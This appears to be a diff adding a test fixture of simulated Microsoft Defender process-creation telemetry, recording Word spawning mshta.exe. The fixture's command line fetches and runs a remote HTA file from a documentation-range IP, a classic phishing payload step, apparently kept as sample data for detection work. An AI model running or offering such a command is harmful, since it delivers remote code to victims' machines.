@@ -1,0 +1,17 @@
+[
+  {
+    "_source": "defender_hunting",
+    "category": "AdvancedHunting-DeviceProcessEvents",
+    "tenantId": "11111111-1111-1111-1111-111111111111",
+    "properties": {
+      "DeviceId": "3333333333333333333333333333333333333333",
+      "DeviceName": "acct-01.example.org",
+      "ActionType": "ProcessCreated",
+      "FileName": "mshta.exe",
+      "FolderPath": "C:/Windows/System32/mshta.exe",
+      "ProcessCommandLine": "mshta.exe https://203.0.113.80/invoice.hta",
+      "InitiatingProcessFileName": "WINWORD.EXE",
+      "AccountName": "jdoe"
+    }
+  }
+]
